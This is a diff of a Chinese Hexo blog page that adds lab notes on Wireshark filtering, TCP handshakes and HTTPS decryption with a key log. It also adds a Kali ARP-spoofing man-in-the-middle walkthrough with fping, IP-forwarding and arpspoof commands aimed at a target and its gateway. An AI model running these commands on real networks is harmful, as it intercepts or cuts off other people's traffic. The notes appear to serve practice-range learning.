@@ -70,7 +70,7 @@
 					</ul>
 	
 					<ul>
-						<li class="file">
+						<li class="file active">
 							<a href="/2021/11/03/1_东塔/靶场/20201103【笔记】Wireshark/">
 								<i class="fa fa-file"></i>
 								20201103【笔记】Wireshark
@@ -219,14 +219,56 @@
 		<div id="content">
 			<div>
 	<span id="post-author">求幂级数的收敛域</span>
-	<span id="post-date">2021-02-01 16:38:41</span>
+	<span id="post-date">2021-11-03 09:00:00</span>
 </div>
 
 <div id="article">
-	<h1 id="关于"><a href="#关于" class="headerlink" title="关于"></a>关于</h1><p><a target="_blank" rel="noopener" href="http://www.ukpkmkk.com/">www.ukpkmkk.com</a></p>
-<p>Hexo搭建，使用主题：<a target="_blank" rel="noopener" href="https://github.com/ITAbyss/hexo-wiki">https://github.com/ITAbyss/hexo-wiki</a></p>
-<p>有事请加微信，欢迎探讨交流。</p>
-<img src="https://i.loli.net/2021/02/01/jJmi1zEa8D3dcVX.png" alt="image-20210201163253316" style="zoom: 50%;" />
+	<h1 id="Wireshark"><a href="#Wireshark" class="headerlink" title="Wireshark"></a>Wireshark</h1><p>捕获过滤器 port 80</p>
+<p>​                    host 106.55.4.57</p>
+<p><img src="https://i.loli.net/2021/02/24/I9OTyCLP5SRNBiX.png" alt="img"></p>
+<p>显示过滤器 ip.src == 14.22.3.99</p>
+<p>​                    ip.addr == 14.22.3.99</p>
+<p><img src="https://i.loli.net/2021/02/24/Cj31t9yqw4nzex2.png" alt="image-20201103144248165"></p>
+<p><img src="https://i.loli.net/2021/02/24/tmG7SnZjQpAUf6F.png" alt="image-20201103141357880"></p>
+<p>查看会话</p>
+<p><img src="https://i.loli.net/2021/02/24/pBD7XZC3O15YEK4.png" alt="image-20201103141642239"></p>
+<p>TCP</p>
+<p>三次握手</p>
+<p>​        [SYN]</p>
+<p>​        [SYN,ACK]</p>
+<p>​        [ACK]</p>
+<p><img src="https://i.loli.net/2021/02/24/gRP1saziG3hvEmn.png" alt="image-20201103100844467"></p>
+<p>四次挥手</p>
+<p>​        [FIN,ACK]</p>
+<p>​        [ACK]</p>
+<p>​        [FIN,ACK]</p>
+<p>​        [ACK]</p>
+<p><img src="https://i.loli.net/2021/02/24/o2RbxYWgOaT6ZE4.png" alt="image-20201103100829001"></p>
+<p>抓HTTPS</p>
+<p>SSL/TSL协议加密算法</p>
+<p>证书 SHA256校验</p>
+<p>ECDHE 椭圆迪菲赫尔曼短暂算法交换密钥</p>
+<p>RSA传输DES的密钥</p>
+<p>使用DES加密数据</p>
+<p>ECDHE_RSA_DES_SHA256</p>
+<p>需要将私钥文件导入到红框</p>
+<p><img src="https://i.loli.net/2021/02/24/j49g5hBcE81mSkF.png" alt="image-20201103155830945"></p>
+<p>D:\tmp\sslkey.log</p>
+<h1 id="ARP欺骗-中间人攻击"><a href="#ARP欺骗-中间人攻击" class="headerlink" title="ARP欺骗 中间人攻击"></a>ARP欺骗 中间人攻击</h1><h2 id="kali"><a href="#kali" class="headerlink" title="kali"></a>kali</h2><p>fping -g 192.168.10.1/24 -a</p>
+<p>kali查看IP转发标志位    cat /proc/sys/net/ipv4/ip_forward</p>
+<p>kali修改IP转发标志位    echo 1 &gt; /proc/sys/net/ipv4/ip_forward</p>
+<p><img src="https://i.loli.net/2021/02/24/zgHbQIyqpAPfcen.png" alt="image-20201103210925376"></p>
+<h5 id="ARP攻击"><a href="#ARP攻击" class="headerlink" title="ARP攻击"></a>ARP攻击</h5><p>把 转发标志位  置0</p>
+<p>sudo arpspoof -i eth0 -t 192.168.10.179 -r 192.168.10.254</p>
+<p>192.168.10.179 目标</p>
+<p>192.168.10.254 网关</p>
+<p><img src="https://i.loli.net/2021/02/24/Pmq7L39QKSBtUhi.png" alt="image-20201103224903685"></p>
+<p>目标就上不了网了</p>
+<h5 id="ARP欺骗"><a href="#ARP欺骗" class="headerlink" title="ARP欺骗"></a>ARP欺骗</h5><p>把转发标志位置1</p>
+<p>sudo arpspoof -i eth0 -t 192.168.10.179 -r 192.168.10.254</p>
+<p>本机的ARP表</p>
+<p><img src="https://i.loli.net/2021/02/24/hLTo5n1YvmxNMUs.png" alt="image-20201103224432304"></p>
+
 </div>
 
 		</div>
